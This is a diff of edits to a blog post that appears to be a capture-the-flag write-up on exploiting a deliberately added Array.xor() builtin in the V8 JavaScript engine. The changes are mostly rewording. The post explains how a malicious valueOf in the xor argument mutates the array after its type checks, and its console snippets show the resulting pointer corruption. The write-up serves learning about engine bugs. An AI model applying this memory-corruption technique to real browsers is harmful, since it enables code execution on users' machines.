@@ -130,7 +130,7 @@ BUILTIN(ArrayXor) {
 }
 ```
 
-The patch adds a new `Array.xor()` prototype that can be used to xor all values within an array of doubles, let's try it:
+The patch adds a new **Array.xor()** prototype that can be used to xor all values within an array of doubles, let's try it:
 
 <div class="jsConsole">
 	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">0.1</span>, <span class="jsConValIn">0.2</span>, <span class="jsConValIn">0.3</span>]</div>
@@ -266,11 +266,13 @@ Quite the peculiar feature. It may seem a little confusing if you aren't familia
 	<div class="jsConLine">= <span class="jsConValIn">0x3fb9999999999<span class="jsConFun">ca3</span></span></div>
 </div>
 
-Hmm, XORing doubles isn't going to get us anywhere[^1] though as the values are stored in a doubles array (`PACKED_DOUBLE_ELEMENTS`[^2]) as just raw doubles. All we can do is change some numbers around in an array, but that's something we can already do without xor. It'd be a lot more interesting if we could run this xor thing on a mixed array (`PACKED_ELEMENTS`) consisting of memory pointers to other objects, since we could point the pointers to places in memory we're not supposed to.
+It pretty much just interprets the double as an integer, and then performs the XOR operation on it. In this example we XORed the doubles with 0x539 (1337 in hex), so the last three hex digits of each double changed. It's a pretty silly operation to perform on a double.
+
+Just XORing doubles isn't going to get us anywhere though, since the values are stored in a doubles array (`PACKED_DOUBLE_ELEMENTS`[^2]) as just *raw 64-bit doubles*. All we can do is change some numbers around, but that's something we can already do without xor. It'd be a lot more interesting if we could run this xor thingie on a mixed array (`PACKED_ELEMENTS`) consisting of *memory pointers* to other JavaScript objects, because we could point the pointers to places in memory we're not supposed to.
 
 <!-- Alright, let's see if we can break it somehow.  .To achieve memory corruption, we must somehow use this xor functionality on an array that has other kinds of elements in it . We'll see later why that is, but for now let's just try to find a way to do it. -->
 
-So let's try a simple array with an object in it:
+Alright, let's try an array with an object in it then:
 
 <div class="jsConsole">
 	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">0.1</span>, <span class="jsConValIn">0.2</span>, {}] <span class="jsConNull">// PACKED_ELEMENTS array</span></div>
@@ -289,17 +291,17 @@ Hmm, seems like there's a check in-place to prevent us from doing this:
   }
 ```
 
-But what if we do create a double array, but then wrap it in an evil [proxy](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy)?
+But what if we create a double array, but then wrap it in an evil [proxy](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy)?
 
 <div class="jsConsole">
 	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">0.1</span>, <span class="jsConValIn">0.2</span>, <span class="jsConValIn">0.3</span>]</div>
 	<div class="jsConBorder"></div>
 	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evilHandler</span> = <span style="white-space: pre-wrap">{
-<span class="js480">    </span>     <span class="jsConFun">get</span>(<span class="jsConIdx">target</span>, <span class="jsConIdx">prop</span>, <span class="jsConIdx">receiver</span>) {
-<span class="js480">      </span>       <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">`Got </span>${<span class="jsConVar">prop</span>}<span class="jsConStr">!`</span>);
-<span class="js480">      </span>       <span class="jsConKw">return</span> <span class="jsConVar">Reflect</span>.<span class="jsConFun">get</span>(...<span class="jsConVar">arguments</span>);
-<span class="js480">    </span>     }
-<span class="js480">  </span>   }</span></div>
+     <span class="jsConFun">get</span>(<span class="jsConIdx">target</span>, <span class="jsConIdx">prop</span>, <span class="jsConIdx">receiver</span>) {
+       <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">`Got </span>${<span class="jsConVar">prop</span>}<span class="jsConStr">!`</span>);
+       <span class="jsConKw">return</span> <span class="jsConVar">Reflect</span>.<span class="jsConFun">get</span>(...<span class="jsConVar">arguments</span>);
+     }
+   }</span></div>
 	<div class="jsConBorder"></div>
 	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evil</span> = <span class="jsConKw">new</span> <span class="jsConVar">Proxy</span>(<span class="jsConVar">arr</span>, <span class="jsConVar">evilHandler</span>)</div>
 	<div class="jsConBorder"></div>
@@ -347,9 +349,9 @@ if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::ca
 }
 ```
 
-The `IsJSArray` method makes sure that we are in fact passing an array, and the `HasOnlySimpleReceiverElements` method checks for anything sus[^3] within the array or it's prototype.
+The **IsJSArray** method makes sure that we are in fact passing an array, and the **HasOnlySimpleReceiverElements** method checks for anything sus[^3] within the array or it's prototype.
 
-Hmmph, this seems pretty well coded so far. There is no way for us to get anything other than a basic double array past these checks, and xoring such an array isn't going to accomplish anything. I went on to carefully examine other parts of the code for any possible flaws.
+Hmmph, this seems pretty well coded so far. There is no way for us to get anything other than a basic double array past these checks, and XORing such an array isn't going to accomplish anything. I went on to carefully examine other parts of the code for any possible flaws.
 
 The length of the array gets stored in a `uint32_t`, and I thought that perhaps we could overflow this value, but it turns out you can't make an array that big:
 
@@ -379,18 +381,23 @@ I also tried messing with the length value, but v8 doesn't allow us to do that i
 	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>TypeError: Array.xor needs array of double numbers</div></div>
 </div>
 
-And then it hit me - we're only doing all these checks on the array itself, not the argument! We get the argument to xor with (`Object::ToNumber(isolate, args.at(1))`) *after* we're already past all the previous checks, so perhaps we could take our double array and change it so something more interesting here? Let's give it a shot:
+And then it hit me - we're only doing all these fancy checks on the array itself, but not the argument! We get our xor argument (`Object::ToNumber(isolate, args.at(1))`) *after* we're already past all the previous checks, so perhaps we could turn the xor argument evil instead and put an object in the double array once we're already past the checks? Let's give it a shot:
 
 <div class="jsConsole">
 		<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>, <span class="jsConValIn">3.3</span>]</div>
 	<div class="jsConBorder"></div>
-		<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evil</span> = { <span class="jsConFun">valueOf</span>: () => { <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {}; <span class="jsConKw">return</span> <span class="jsConValIn">1337</span> } }</div>
+		<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evil</span> = {<span style="white-space: pre-wrap">
+     <span class="jsConFun">valueOf</span>: () => {
+       <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {};
+       <span class="jsConKw">return</span> <span class="jsConValIn">1337</span>;
+     }
+   }</span></div>
 	<div class="jsConBorder"></div>
 	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">evil</span>) <span class="jsConNull">// our array turns into PACKED_ELEMENTS here!</span></div>
 	<div class="jsConBorder"></div>
 	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
 	<div class="jsConBorder"></div>
-	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,10 4,6 8,2 8.85,2.85 5.7,6 8.85,9.15 Z"/><circle cx="10" cy="6" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">140508</span>, <span class="jsConValOut">2.2</span>, <span class="jsConValOut">140484</span>]</i></summary>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,10 4,6 8,2 8.85,2.85 5.7,6 8.85,9.15 Z"/><circle cx="10" cy="6" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">140508</span>, <span class="jsConValOut">2.2</span>, <span class="jsConValOut">140484</span>]</i> <span class="jsConNull">// waow!</span></summary>
 <div style="padding-left: 24px">
 	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x000449b8</span> (<span class="jsConType">SMI</span>)<br/>
 	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x00044cbd</span> (<span class="jsConType">pointer to double</span>)<br/>
